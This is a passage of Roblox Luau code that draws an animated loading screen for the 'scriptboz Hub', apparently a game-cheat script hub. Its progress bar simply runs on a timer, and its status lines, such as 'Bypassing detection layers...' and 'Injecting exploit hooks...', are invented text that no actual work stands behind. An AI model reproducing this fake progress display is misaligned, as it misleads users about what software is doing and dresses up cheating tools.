    local s = Instance.new("UIScale", avatarFrame)
    while card.Parent do
        TweenService:Create(s,TweenInfo.new(1.2,Enum.EasingStyle.Sine,Enum.EasingDirection.InOut),{Scale=1.06}):Play(); task.wait(1.2)
        TweenService:Create(s,TweenInfo.new(1.2,Enum.EasingStyle.Sine,Enum.EasingDirection.InOut),{Scale=1.0}):Play(); task.wait(1.2)
    end
end)

-- CHANNEL NAME
local chanName = Instance.new("TextLabel", card)
chanName.Size = UDim2.new(1,-16,0,24); chanName.AnchorPoint = Vector2.new(0.5,0)
chanName.Position = UDim2.new(0.5,0,0,94); chanName.BackgroundTransparency = 1
chanName.Text = "scriptboz"; chanName.Font = Enum.Font.GothamBlack
chanName.TextSize = 20; chanName.TextColor3 = Color3.fromRGB(255,255,255); chanName.ZIndex = 22
local chanHandle = Instance.new("TextLabel", card)
chanHandle.Size = UDim2.new(1,-16,0,16); chanHandle.AnchorPoint = Vector2.new(0.5,0)
chanHandle.Position = UDim2.new(0.5,0,0,118); chanHandle.BackgroundTransparency = 1
chanHandle.Text = "@scriptboz"; chanHandle.Font = Enum.Font.Gotham
chanHandle.TextSize = 11; chanHandle.TextColor3 = Color3.fromRGB(100,150,200); chanHandle.ZIndex = 22

-- SEPARATOR
local sep = Instance.new("Frame", card)
sep.Size = UDim2.new(0.78,0,0,1); sep.AnchorPoint = Vector2.new(0.5,0)
sep.Position = UDim2.new(0.5,0,0,142); sep.BackgroundColor3 = Color3.fromRGB(70,140,220)
sep.BackgroundTransparency = 0.55; sep.BorderSizePixel = 0; sep.ZIndex = 22
local sepG = Instance.new("UIGradient", sep)
sepG.Transparency = NumberSequence.new{NumberSequenceKeypoint.new(0,1),NumberSequenceKeypoint.new(0.15,0),NumberSequenceKeypoint.new(0.85,0),NumberSequenceKeypoint.new(1,1)}

-- SCRIPT LOADING LABEL
local scriptTag = Instance.new("TextLabel", card)
scriptTag.Size = UDim2.new(1,-20,0,20); scriptTag.AnchorPoint = Vector2.new(0.5,0)
scriptTag.Position = UDim2.new(0.5,0,0,150); scriptTag.BackgroundTransparency = 1
scriptTag.Text = "⚡  SCRIPT LOADING"; scriptTag.Font = Enum.Font.GothamBold
scriptTag.TextSize = 13; scriptTag.TextColor3 = Color3.fromRGB(80,190,255); scriptTag.ZIndex = 22
task.spawn(function()
    while card.Parent do
        TweenService:Create(scriptTag,TweenInfo.new(0.65,Enum.EasingStyle.Sine),{TextTransparency=0.45}):Play(); task.wait(0.65)
        TweenService:Create(scriptTag,TweenInfo.new(0.65,Enum.EasingStyle.Sine),{TextTransparency=0}):Play(); task.wait(0.65)
    end
end)

-- STATUS CYCLING
local statusLabel = Instance.new("TextLabel", card)
statusLabel.Size = UDim2.new(1,-20,0,16); statusLabel.AnchorPoint = Vector2.new(0.5,0)
statusLabel.Position = UDim2.new(0.5,0,0,174); statusLabel.BackgroundTransparency = 1
statusLabel.Text = "Initializing modules..."; statusLabel.Font = Enum.Font.Gotham
statusLabel.TextSize = 11; statusLabel.TextColor3 = Color3.fromRGB(100,150,200); statusLabel.ZIndex = 22
local msgs = {"Initializing modules...","Loading remote functions...","Bypassing detection layers...","Fetching latest patches...","Connecting to servers...","Injecting exploit hooks...","Verifying script integrity...","Warming up features...","Almost ready..."}
local mi = 1
task.spawn(function()
    while card.Parent do
        TweenService:Create(statusLabel,TweenInfo.new(0.18),{TextTransparency=1}):Play(); task.wait(0.18)
        mi=(mi%#msgs)+1; statusLabel.Text=msgs[mi]
        TweenService:Create(statusLabel,TweenInfo.new(0.18),{TextTransparency=0}):Play()
        task.wait(math.random(30,70)/10)
    end
end)

-- PROGRESS BAR
local barBG = Instance.new("Frame", card)
barBG.Size = UDim2.new(0.84,0,0,7); barBG.AnchorPoint = Vector2.new(0.5,0)
barBG.Position = UDim2.new(0.5,0,0,198); barBG.BackgroundColor3 = Color3.fromRGB(20,28,45)
barBG.BorderSizePixel = 0; barBG.ZIndex = 22
Instance.new("UICorner", barBG).CornerRadius = UDim.new(0,7)
local iBar2 = Instance.new("Frame", barBG)
iBar2.Size = UDim2.fromScale(0,1); iBar2.BackgroundColor3 = Color3.fromRGB(60,160,255)
iBar2.BorderSizePixel = 0; iBar2.ZIndex = 23
Instance.new("UICorner", iBar2).CornerRadius = UDim.new(0,7)
local barGrad = Instance.new("UIGradient", iBar2)
barGrad.Color = ColorSequence.new{ColorSequenceKeypoint.new(0,Color3.fromRGB(30,100,220)),ColorSequenceKeypoint.new(1,Color3.fromRGB(140,220,255))}
local shim = Instance.new("Frame", iBar2)
shim.Size = UDim2.new(0,20,1,0); shim.Position = UDim2.fromScale(-0.5,0)
shim.BackgroundColor3 = Color3.fromRGB(220,240,255); shim.BackgroundTransparency = 0.55
shim.BorderSizePixel = 0; shim.ZIndex = 24
Instance.new("UICorner", shim).CornerRadius = UDim.new(0,7)
local shimG = Instance.new("UIGradient", shim); shimG.Rotation = 90
shimG.Transparency = NumberSequence.new{NumberSequenceKeypoint.new(0,1),NumberSequenceKeypoint.new(0.5,0.4),NumberSequenceKeypoint.new(1,1)}
task.spawn(function()
    while card.Parent do
        TweenService:Create(shim,TweenInfo.new(0.9,Enum.EasingStyle.Sine),{Position=UDim2.fromScale(1.4,0)}):Play()
        task.wait(0.9); shim.Position=UDim2.fromScale(-0.5,0); task.wait(0.05)
    end
end)
local tip = Instance.new("Frame", barBG)
tip.Size = UDim2.new(0,4,0,13); tip.AnchorPoint = Vector2.new(0.5,0.5)
tip.Position = UDim2.fromScale(0.01,0.5); tip.BackgroundColor3 = Color3.fromRGB(180,230,255)
tip.BackgroundTransparency = 0.05; tip.BorderSizePixel = 0; tip.ZIndex = 25
Instance.new("UICorner", tip).CornerRadius = UDim.new(1,0)

-- TIMER + PERCENT ROW
local tRow = Instance.new("Frame", card)
tRow.Size = UDim2.new(0.84,0,0,18); tRow.AnchorPoint = Vector2.new(0.5,0)
tRow.Position = UDim2.new(0.5,0,0,209); tRow.BackgroundTransparency = 1; tRow.ZIndex = 22
local timerL = Instance.new("TextLabel", tRow)
timerL.Size = UDim2.fromScale(0.5,1); timerL.BackgroundTransparency = 1; timerL.Text = "02:00"
timerL.Font = Enum.Font.GothamBold; timerL.TextSize = 11; timerL.TextColor3 = Color3.fromRGB(80,160,220)
timerL.TextXAlignment = Enum.TextXAlignment.Left; timerL.ZIndex = 22
local pctL = Instance.new("TextLabel", tRow)
pctL.Size = UDim2.fromScale(0.5,1); pctL.Position = UDim2.fromScale(0.5,0); pctL.BackgroundTransparency = 1
pctL.Text = "0%"; pctL.Font = Enum.Font.GothamBold; pctL.TextSize = 11
pctL.TextColor3 = Color3.fromRGB(60,130,180); pctL.TextXAlignment = Enum.TextXAlignment.Right; pctL.ZIndex = 22

-- ANIMATED DOTS
local dotsF = Instance.new("Frame", card)
dotsF.Size = UDim2.new(0,48,0,10); dotsF.AnchorPoint = Vector2.new(0.5,0)
dotsF.Position = UDim2.new(0.5,0,0,234); dotsF.BackgroundTransparency = 1; dotsF.ZIndex = 22
local dots = {}
for i=1,4 do
    local d = Instance.new("Frame", dotsF)
    d.Size = UDim2.new(0,6,0,6); d.Position = UDim2.new(0,(i-1)*14,0.5,-3)
    d.BackgroundColor3 = Color3.fromRGB(60,160,255); d.BackgroundTransparency = 0.65
    d.BorderSizePixel = 0; d.ZIndex = 23
    Instance.new("UICorner", d).CornerRadius = UDim.new(1,0); dots[i]=d
end
task.spawn(function()
    local idx=1
    while card.Parent do
        for i,d in ipairs(dots) do
            local a=(i==idx)
            TweenService:Create(d,TweenInfo.new(0.13),{BackgroundTransparency=a and 0 or 0.7,Size=a and UDim2.new(0,9,0,9) or UDim2.new(0,5,0,5)}):Play()
        end
        idx=(idx%#dots)+1; task.wait(0.13)
    end
end)

-- WATERMARK
local ver = Instance.new("TextLabel", card)
ver.Size = UDim2.new(1,-16,0,14); ver.AnchorPoint = Vector2.new(0.5,0)
ver.Position = UDim2.new(0.5,0,0,252); ver.BackgroundTransparency = 1
ver.Text = "scriptboz  •  for educational purposes only"
ver.Font = Enum.Font.Gotham; ver.TextSize = 10; ver.TextColor3 = Color3.fromRGB(50,85,125); ver.ZIndex = 22

-- PARTICLES
task.spawn(function()
    while card.Parent do
        local p=Instance.new("Frame",gui); local sz=math.random(2,4)
        p.Size=UDim2.new(0,sz,0,sz); p.BackgroundColor3=Color3.fromRGB(math.random(50,120),math.random(150,220),255)
        p.BackgroundTransparency=math.random(30,60)/100; p.BorderSizePixel=0; p.ZIndex=18
        local cx=0.5+(math.random(-16,16)/100); local cy=0.5+(math.random(-22,22)/100)
        p.Position=UDim2.fromScale(cx,cy+0.25)
        Instance.new("UICorner",p).CornerRadius=UDim.new(1,0)
        local dur=math.random(28,55)/10
        TweenService:Create(p,TweenInfo.new(dur,Enum.EasingStyle.Sine),{Position=UDim2.fromScale(cx+(math.random(-6,6)/100),cy-0.22),BackgroundTransparency=1}):Play()
        task.delay(dur,function() if p and p.Parent then p:Destroy() end end)
        task.wait(math.random(18,40)/100)
    end
end)

-- MAIN LOADING LOOP (3 minutes)
local loadStart=tick(); local LOAD_TIME=120
while true do
    local elapsed=tick()-loadStart; local p=math.clamp(elapsed/LOAD_TIME,0,1)
    iBar2.Size=iBar2.Size:Lerp(UDim2.fromScale(p,1),0.10)
    tip.Position=UDim2.fromScale(math.clamp(p,0.01,0.99),0.5)
    local rem=math.max(0,LOAD_TIME-elapsed)
    timerL.Text=string.format("%02d:%02d",math.floor(rem/60),math.floor(rem%60))
    pctL.Text=math.floor(p*100).."%"
    if p>=1 then break end
    RunService.RenderStepped:Wait()
end

-- PHASE 2 — finalize 5s
chanHandle.Text="Finalizing..."; iBar2.Size=UDim2.fromScale(0,1); pctL.Text="0%"
local t2=tick()
while tick()-t2<5 do
    local e2=tick()-t2; local p2=e2/5
    iBar2.Size=UDim2.fromScale(p2,1); tip.Position=UDim2.fromScale(math.clamp(p2,0.01,0.99),0.5)
    timerL.Text=string.format("00:%02d",math.floor(math.max(0,5-e2))); pctL.Text=math.floor(p2*100).."%"
    RunService.RenderStepped:Wait()
end

-- FADE OUT
TweenService:Create(cScale,TweenInfo.new(0.3,Enum.EasingStyle.Sine,Enum.EasingDirection.In),{Scale=0.88}):Play()
for _,v in ipairs(card:GetDescendants()) do
    if v:IsA("GuiObject") then
        pcall(function()
            TweenService:Create(v,TweenInfo.new(0.28),{BackgroundTransparency=1,TextTransparency=1,ImageTransparency=1}):Play()
        end)
    end
end
TweenService:Create(card,TweenInfo.new(0.28),{BackgroundTransparency=1}):Play()
task.wait(0.35); card:Destroy()
TweenService:Create(blur,TweenInfo.new(0.4,Enum.EasingStyle.Sine),{Size=0}):Play()

-- NOTIFY + SHOW MAIN UI
local function Notify(text)
    local n=Instance.new("TextLabel",gui); n.Size=UDim2.fromScale(0.32,0.055); n.Position=UDim2.fromScale(0.34,0.02)
    n.BackgroundColor3=Color3.fromRGB(15,15,20); n.TextColor3=Color3.fromRGB(100,200,255); n.Text=text
    n.Font=Enum.Font.GothamBold; n.TextSize=16; n.TextWrapped=true; n.BackgroundTransparency=0.08
    n.TextTransparency=1; n.ZIndex=50
    Instance.new("UICorner",n).CornerRadius=UDim.new(0,10)
    local s=Instance.new("UIStroke",n); s.Color=Color3.fromRGB(80,180,255); s.Thickness=1
    TweenService:Create(n,TweenInfo.new(0.25),{TextTransparency=0}):Play()
    task.delay(2.5,function()
        TweenService:Create(n,TweenInfo.new(0.3),{TextTransparency=1,BackgroundTransparency=1}):Play()
        task.wait(0.3); n:Destroy()
    end)
end
Notify("scriptboz Hub Loaded! ⚡")

win.Visible=true; shadow.Visible=false
win.Size=UDim2.new(0,W,0,0); win.BackgroundTransparency=0.5
tw(win,.5,{Size=UDim2.new(0,W,0,H),BackgroundTransparency=0},Enum.EasingStyle.Back):Play()
